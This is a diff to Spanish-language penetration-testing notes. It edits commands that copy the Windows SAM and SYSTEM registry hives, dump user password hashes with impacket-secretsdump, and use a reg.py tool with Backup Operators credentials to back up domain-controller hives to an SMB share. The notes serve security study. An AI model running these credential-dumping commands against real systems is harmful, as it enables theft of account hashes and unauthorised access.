@@ -242,8 +242,8 @@ Notas:
 
 ## FORMA 1
 Pasos:   
-❯ reg save hklm\sam C:\temp\sam.hive           # Hacer una copia de la SAM en Windows y descargarlo 
-❯ reg save hklm\system C:\temp\system.hive     # Hacer una copia del system en Windows y descargarlo
+❯ reg save hklm\sam C:\windows\temp\sam.hive           # Hacer una copia de la SAM en Windows y descargarlo 
+❯ reg save hklm\system C:\windows\temp\system.hive     # Hacer una copia del system en Windows y descargarlo
 
 ❯ impacket-secretsdump -sam sam.hive -system system.hive LOCAL     # Dumpear los hashes de los usuarios desde Kali con los archivos obtenidos 
 
@@ -253,7 +253,8 @@ Notas:
 
 ## FORMA 2
 Pasos:
-❯ https://github.com/horizon3ai/backup_dc_registry/blob/main/reg.py    # Descargar la tool 
+# Descargar la tool 
+❯ https://github.com/horizon3ai/backup_dc_registry/blob/main/reg.py    
 
 ❯ python3 reg.py user:'passwd'@IP backup -p '\\IP\smbFolder'
 	# user:passwd = Credenciales validas del usuario que se encuentra en el grupo 'Backup Operators'
